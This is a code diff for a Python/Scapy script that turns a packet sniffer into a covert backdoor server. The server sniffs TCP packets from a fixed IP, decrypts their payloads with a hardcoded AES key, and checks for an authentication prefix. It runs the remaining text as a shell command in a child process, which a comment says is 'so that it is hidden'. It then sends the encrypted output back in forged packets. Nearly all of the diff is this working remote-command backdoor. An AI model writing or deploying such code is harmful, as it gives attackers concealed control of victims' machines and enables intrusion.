@@ -19,35 +19,47 @@ def usage():
         sys.exit()
 
 
+#key to authenticating the packet
+authPacket = "Authenticate packets"
+#Encryption and decryption variables and initialization
+secretKey = "Secret key lost."
+saltySpatoon = "How tough areyou"
+crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)
+
 def server(pkt):
+    #Instantiate variables
+    decryptedData=""
+    newData = ""
+    #Grab the source IP for each packets
+    src_ip = pkt[IP].src
 
-	#key to authenticating the packet
-	authPacket = "Authenticate packets"
-	#Encryption and decryption variables and initialization
-	secretKey = "Secret key lost."
-	saltySpatoon = "How tough areyou"
-	crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)
+    if src_ip == "192.168.0.14":
+        #Grab the raw data
+        data = pkt[Raw].load
+        #Decrypt the raw data
+        decryptedData = crypt.decrypt(data)
+        #If the decrypted data is authenticated, print it
+        if decryptedData.startswith(authPacket) == True:
+            #Take out the authentication part
+            newData = decryptedData[20:]
+            #If we get exit command, exit out of the system
+            if newData == "exit":
+                time.sleep(2)
+                sys.exit()
+            else:
+                #Run the command using a child process so that it is hidden
+                process = subprocess.Popen(newData, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                #Store the output of the command into output variable
+                output = process.stdout.read() + process.stderr.read()
+                #Encrypt the output and add the packet authenticator before sending back
+                encryptedReply = crypt.encrypt(authPacket + output)
+                #Create the output packet
 
-	src_ip = pkt[IP].src
-
-	print str(src_ip)
-
-	if src_ip == "127.0.0.1":
-
-		data = pkt[Raw].load
-
-		decryptedData = crypt.decrypt(data)
-
-		if decryptedData.startswith(authPacket):
-			newData = decryptedData[20:]
-
-			print newData
-
-
-
-
-
-
+                pkt = IP(src="192.168.0.15", dst="192.168.0.14")/TCP()/Raw(load=encryptedReply)
+                #Send the packet
+                send(pkt)
+        else:
+            print data
 
 
 sniff(filter="tcp", prn=server)
